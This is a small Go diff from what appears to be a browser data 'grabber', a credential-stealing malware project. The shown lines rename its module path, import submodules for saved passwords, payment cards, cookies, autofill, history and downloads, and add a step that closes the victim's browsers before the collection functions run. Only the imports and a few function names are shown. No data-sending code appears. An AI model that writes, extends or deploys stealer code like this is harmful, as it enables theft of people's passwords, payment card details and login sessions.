@@ -3,12 +3,13 @@ package browsers
 import (
 	"os"
 
-	"example.com/grabber/browsers/autofill"
-	"example.com/grabber/browsers/cards"
-	"example.com/grabber/browsers/cookies"
-	"example.com/grabber/browsers/downloads"
-	"example.com/grabber/browsers/history"
-	"example.com/grabber/browsers/pass"
+	"kdot/grabber/browsers/autofill"
+	"kdot/grabber/browsers/cards"
+	"kdot/grabber/browsers/cookies"
+	"kdot/grabber/browsers/downloads"
+	"kdot/grabber/browsers/history"
+	"kdot/grabber/browsers/pass"
+	"kdot/grabber/browsers/util"
 )
 
 func GetBrowserPasswords() {
@@ -38,6 +39,7 @@ func GetBrowserDownloads() {
 }
 
 func GetBrowserData() {
+	util.CloseBrowsers()
 	GetBrowserPasswords()
 	GetBrowserHistory()
 	GetBrowserCookies()
